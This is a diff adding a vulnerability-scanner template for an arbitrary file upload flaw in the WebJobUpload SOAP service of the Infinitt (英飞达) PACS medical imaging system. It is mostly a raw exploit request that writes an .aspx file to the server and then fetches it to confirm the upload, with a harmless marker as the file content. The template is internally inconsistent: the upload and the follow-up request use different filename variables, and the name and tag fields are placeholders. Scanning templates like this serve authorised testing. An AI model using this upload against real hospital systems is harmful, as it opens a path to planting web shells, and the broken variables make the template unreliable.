@@ -1,0 +1,48 @@
+id: yfd-WebJobUpload-upload
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: 英飞达医学影像存档与通信系统WebJobUpload任意文件上传漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%8B%B1%E9%A3%9E%E8%BE%BE%E5%8C%BB%E5%AD%A6%E5%BD%B1%E5%83%8F%E5%AD%98%E6%A1%A3%E4%B8%8E%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9FWebJobUpload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |-
+        POST /webservices/WebJobUpload.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Content-Length: 410
+        Accept-Encoding: gzip, deflate
+        Content-Type: text/xml; charset=utf-8
+        Soapaction: "http://rainier/jobUpload"
+        Connection: close
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <jobUpload xmlns="http://rainier">
+        <vcode>1</vcode>
+        <subFolder></subFolder>
+        <fileName>{{whoisceshi}}.aspx</fileName>
+        <bufValue>d2hvaXNjZXNoaQ==</bufValue>
+        </jobUpload>
+        </soap:Body>
+        </soap:Envelope>
+      - |-
+        GET /1/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br, zstd
+        Accept-Language: zh-CN,zh;q=0.9
+    matchers:
+      - type: word
+        part: body
+        words:
+          - whoisceshi
